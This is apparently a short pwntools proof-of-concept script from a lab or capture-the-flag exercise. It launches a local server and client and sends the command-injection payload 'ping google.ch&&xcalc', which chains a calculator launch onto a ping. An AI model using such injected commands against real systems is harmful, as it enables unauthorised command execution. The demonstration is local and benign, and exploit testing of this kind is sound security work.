from pwn import *

context.clear(arch = 'amd64')
# ASLR has to be disabled (can be enabled if a additional cout is added.)

server = process('bin/server')
client = process(['bin/client', '127.0.0.1', '1337'])

# Perform command injection
s = 'ping google.ch&&xcalc'
print s
client.sendline(s)

# Get final output
log.info("server cleanup %s" % server.recv(timeout=0.5))
log.info("client cleanup %s" % client.recv(timeout=0.5))

log.info("sleeping 5s so that you can admire calculator")
sleep(5)

# Clean up
client.close()
server.close()
